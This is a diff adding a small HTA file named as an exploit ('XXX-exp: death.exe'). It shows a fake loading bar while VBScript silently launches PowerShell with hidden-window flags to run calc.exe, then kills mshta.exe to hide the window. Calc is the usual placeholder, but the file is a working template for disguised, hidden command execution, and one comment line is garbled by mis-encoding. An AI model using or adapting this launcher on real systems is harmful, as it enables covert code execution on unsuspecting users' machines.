@@ -1,0 +1,17 @@
+<title>XXX-exp</title>
+<center>
+<h1>XXX-exp: death.exe</h1>
+<br>
+<h2>Loading...</h2>
+<br>
+[<marquee scrollAmount=4 width=350 direction=right>|||||||||||||</marquee>]35%
+<br>
+</center>
+<script language="VBScript">
+  Set Hackdo = CreateObject("Wscript.Shell")
+  Set Check = CreateObject("Scripting.FileSystemObject")
+  If Check.FileExists(Hackdo.ExpandEnvironmentStrings("%PSModulePath%") + "..\powershell.exe") Then
+    Hackdo.Run "powershell.exe -nop -w hidden calc.exe"
+    Hackdo.Run "taskkill /f /im mshta.exe"   //kill´°¿Ú
+  End If
+</script>
